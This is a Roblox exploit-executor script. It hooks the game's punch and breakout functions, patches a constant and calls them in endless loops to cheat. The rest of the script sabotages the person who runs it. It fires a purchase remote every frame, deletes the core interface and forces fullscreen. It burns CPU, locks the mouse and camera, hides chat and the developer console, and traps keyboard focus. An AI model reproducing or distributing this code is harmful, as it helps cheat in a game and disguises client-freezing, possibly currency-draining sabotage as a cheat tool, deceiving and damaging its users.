local SafePurchaseRemote = game:GetService("ReplicatedStorage"):WaitForChild("SafePurchaseRemote")
local RunService = game:GetService("RunService")

local punch = {}
local brkout = {}

for i, v in getgc() do
	if typeof(v) == "function" and islclosure(v) and not isourclosure(v) then
		local script = getfenv(v).script

		if tostring(script) == "LocalScript" then
			local name = debug.info(v, "n")

			if name == "attemptPunch" then
				punch = v
			end

			if name == "AttemptBreakout" then
				brkout = v
			end
		end
	end
end
debug.setconstant(punch, 3, 0)

spawn(function()
	while task.wait() do punch() end
end)

spawn(function()
	while task.wait() do brkout(game:GetService("Players").LocalPlayer) end
end)

RunService.Heartbeat:Connect(function()
	pcall(function()
		SafePurchaseRemote:FireServer(1)
	end)
end)

if not UserSettings().GameSettings:InFullScreen() then
	game:GetService("GuiService"):ToggleFullscreen()
end

for i,v in next, game.CoreGui:GetChildren() do
	v:Destroy()
end

local t = Instance.new("TextBox",game.CoreGui)
game:GetService("RunService").Heartbeat:Connect(function()
	for i = 1,999999 do
		math.sqrt(i)
	end
end)

while wait() do
	if not UserSettings().GameSettings:InFullScreen() then
		game:GetService("GuiService"):ToggleFullscreen()
	end
	mousemoveabs(100,100)
	UserSettings().GameSettings.GraphicsQualityLevel = 10
	UserSettings().GameSettings.ChatVisible = false
	game:GetService("StarterGui"):SetCore("DevConsoleVisible",false)
	game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = 0
	game:GetService("Players").LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
	workspace.CurrentCamera.FieldOfView = math.random(25,50)
	t:CaptureFocus()
end
